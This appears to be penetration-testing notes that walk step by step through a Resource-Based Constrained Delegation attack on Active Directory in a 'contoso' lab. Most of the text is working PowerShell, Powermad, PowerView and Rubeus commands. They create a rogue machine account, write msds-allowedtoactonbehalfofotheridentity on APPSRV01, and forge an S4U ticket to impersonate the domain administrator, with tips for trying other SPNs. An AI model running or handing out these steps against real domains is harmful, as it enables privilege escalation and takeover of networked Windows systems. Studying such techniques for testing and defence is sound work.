**IMPORTANT NOTE:** ALL THIS PROCESS MUST BE PERFORMED FROM A POWERSHELL CONSOLE

(RCBD stands for Resource-Based Constrained Delegation)

1st In order to perform the attack, we already need a computer configured with RBCD(with the msds-allowedtoactonbehalfofotheridentity writed), or we could abuse an ACL like GenericWrite in order to write the msds-allowedtoactonbehalfofotheridentity property.(in this PoC it the backend machine will be APPSRV01, the user that have write perssions will be contoso\trike and the fronted SPN will be contoso\mycomputer$)

2nd Create a new computer machine object that will have an SPN assigned to it; creation of the machine with powermad 

`New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force);`

Checking the SPN for that computer with powerview:

`Get-DomainComputer -Identity myComputer`

3rd We must convert the SID of our newly-created computer object to the correct format in order to proceed with the attack:
	
 1. `$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid`	
 	
 2. `$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"`
	
 3. `$SDbytes = New-Object byte[] ($SD.BinaryLength)`
	
 4. `$SD.GetBinaryForm($SDbytes,0)`
	
 5. `Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}`
	
4th After the SecurityDescriptor has been converted to the correct format, we can use Get-DomainComputer to obtain a handle to the computer object for APPSRV01 and then pipe that into Set-DomainObject , which can update properties by specifying them with -Set options:

VERIFICATION THAT WE SUCCESSFULLY WROTE THE "msds-allowedtoactonbehalfofotheridentity" correctly:
	
 1. `$RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity`
	
 2. `$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0`
	
 3. `$Descriptor.DiscretionaryAcl`   -> this will return us an SID in the SecurityIdentifier field, that we must convert
	
 4. `ConvertFrom-SID sid_number`  -> this must return us with: contoso\myComputer$
	
NOW WE WILL REQUEST A TGS FOR THE SPN: "CIFS/appsrv01.contoso.com" USING RUBEUS AND THE S4USELF AND S4UPROXY(this part is very similar to constrained delegation)
	
 1. `.\Rubeus.exe hash /password:h4x`
	
 2. `.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.contoso.com /ptt`

(the msdsspn parameter can be somewhat tricky, so do you can try various SPNs, for example if CIFS/appsrv01.contoso.com didn't worked, you can try CIFS/appsrv01 or something like that). 
